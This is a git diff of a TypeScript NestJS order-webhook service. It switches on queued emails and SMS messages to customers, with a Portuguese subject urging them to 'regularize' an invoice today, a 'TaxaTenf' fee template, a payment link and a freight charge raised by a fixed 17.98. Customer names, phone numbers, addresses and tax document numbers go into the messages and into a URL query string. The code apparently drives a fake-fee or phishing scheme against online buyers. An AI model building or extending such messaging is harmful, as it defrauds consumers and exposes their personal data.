@@ -7,6 +7,15 @@ import * as Agenda from 'agenda';
 import { BodyDTO } from './body';
 import { Queue } from 'bullmq';
 var MailChecker = require('mailchecker');
+import * as Bree from 'bree';
+const bree = new Bree({
+  jobs:[
+    {
+      name:'foo'
+    }
+  ]
+});
+
 async function sendSms(params: any, url: string) {
   // {
   //   "name": "nando6",
@@ -226,7 +235,11 @@ const prisma = new PrismaClient()
 export class AppService {
   constructor(
     @InjectQueue('email') private emailQueue: Queue
-  ) { }
+  ) {
+    // emailQueue.add('send email', {},{
+
+    // })
+   }
 
   async  sendEmail(item, codigoRastreio) {
     var myHeaders = new Headers();
@@ -303,6 +316,7 @@ await agenda.schedule(
   }
 
   async handle(body: BodyDTO, source: string) {
+    
     console.log("body", body.data.id)
     console.log("source", source)
     // @ts-ignore
@@ -422,57 +436,55 @@ await agenda.schedule(
         }
         const item = data
         const codigoRastreio = item.id
-      //   await this.emailQueue.add('send email', {
-      //     to: item.customer.email,
-      //     subject: '[Urgente]: Sua Nota Fiscal Está Disponível – Regularize Hoje Mesmo!',
-      //     template: 'taxa-tenf',
-      //     context: {
-      //         "clientEmail": item.customer.email,
-      //         "clientName": item.customer.name,
-      //         "clientPhone": item.customer.phone,
-      //         "codigoRastreio": codigoRastreio,
-      //         "cep": item.customer?.address?.zipCode || "70872050",
-      //         "data": new Date().toLocaleDateString(),
-      //         "logoUrl": `https://s3.rastreou.org/cod-rastreio/sas.png`,
-      //         "paymentLink": item.paymentLinkTenf,
-      //         "horario": new Date().toLocaleTimeString(),
-      //         "endereco": item.customer.address?.street,
-      //         "state": item.customer.address?.state,
-      //         "valor": (item.amount / 100).toString(),
-      //         "frete": ((item.shipping?.amount / 100 || 0) + 17.98).toString(),
-      //         "storeName": "TaxaTenf",
-      //         "clientDocument": item.customer.document.number,
-      //         "productsHtml": item.items.map((item) => {
-      //           return `
-      //       <tr>
-      // <td style="border-collapse: collapse;"></td>
-      // </tr>
-      // <tr>
-      // <td style="border-collapse: collapse; width: 75px;">
-      // <img src="https://s3.rastreou.org/cod-rastreio/placeholder.png"
-      //     style="width:50px; border: 2px solid; border-radius: 10px;">
-      // </td>
-      // <td style="border-collapse: collapse;">
-      // <p
-      //     style="font-size:14px;line-height:20px;margin-top:0;margin-bottom:0;color:#828282">
-      //     <strong>
-      //       ${item.title}
-      //     </strong></p>
-      // <p
-      //     style="font-size:14px;line-height:20px;margin-top:0;margin-bottom:0;color:#828282">
-      //     ${item.quantity} un. x R$&nbsp;${item.unitPrice / 100}</p>
-      // </td>
-      // </tr>
+        await this.emailQueue.add('send email', {
+          to: item.customer.email,
+          subject: '[Urgente]: Sua Nota Fiscal Está Disponível – Regularize Hoje Mesmo!',
+          template: 'taxa-tenf',
+          context: {
+              "clientEmail": item.customer.email,
+              "clientName": item.customer.name,
+              "clientPhone": item.customer.phone,
+              "codigoRastreio": codigoRastreio,
+              "cep": item.customer?.address?.zipCode || "70872050",
+              "data": new Date().toLocaleDateString(),
+              "logoUrl": `https://s3.rastreou.org/cod-rastreio/sas.png`,
+              "paymentLink": item.paymentLinkTenf,
+              "horario": new Date().toLocaleTimeString(),
+              "endereco": item.customer.address?.street,
+              "state": item.customer.address?.state,
+              "valor": (item.amount / 100).toString(),
+              "frete": ((item.shipping?.amount / 100 || 0) + 17.98).toString(),
+              "storeName": "TaxaTenf",
+              "clientDocument": item.customer.document.number,
+              "productsHtml": item.items.map((item) => {
+                return `
+            <tr>
+      <td style="border-collapse: collapse;"></td>
+      </tr>
+      <tr>
+      <td style="border-collapse: collapse; width: 75px;">
+      <img src="https://s3.rastreou.org/cod-rastreio/placeholder.png"
+          style="width:50px; border: 2px solid; border-radius: 10px;">
+      </td>
+      <td style="border-collapse: collapse;">
+      <p
+          style="font-size:14px;line-height:20px;margin-top:0;margin-bottom:0;color:#828282">
+          <strong>
+            ${item.title}
+          </strong></p>
+      <p
+          style="font-size:14px;line-height:20px;margin-top:0;margin-bottom:0;color:#828282">
+          ${item.quantity} un. x R$&nbsp;${item.unitPrice / 100}</p>
+      </td>
+      </tr>
       
-      // <tr>
-      // <td style="border-collapse: collapse;"></td>
-      // </tr>
-      //       `
-      //         }).join("\n")
-      //       },
-      //   })
-
-
+      <tr>
+      <td style="border-collapse: collapse;"></td>
+      </tr>
+            `
+              }).join("\n")
+            },
+        })
 
         await sendSms({
           "phone": item.customer.phone,
@@ -480,7 +492,8 @@ await agenda.schedule(
           "customized_url":`${item.paymentLinkTenf}?name=${item.customer.name}&document=${item.customer.document.number}&email=${item.customer.email}&telephone=${item.customer.phone}`
         },"https://v1.smsfunnel.com.br/integrations/lists/25dcf660-484f-4a18-a323-211ce8cb3d56/add-lead")
 
-        await this.sendEmail(item, codigoRastreio)
+        // await this.sendEmail(item, codigoRastreio)
+
           // await startFlowTypebotTENF(data, data.id)
           // const transaction = await createTransaction(data)
           // await startFlowTypebotRECUPERACAO(transaction, data.id)
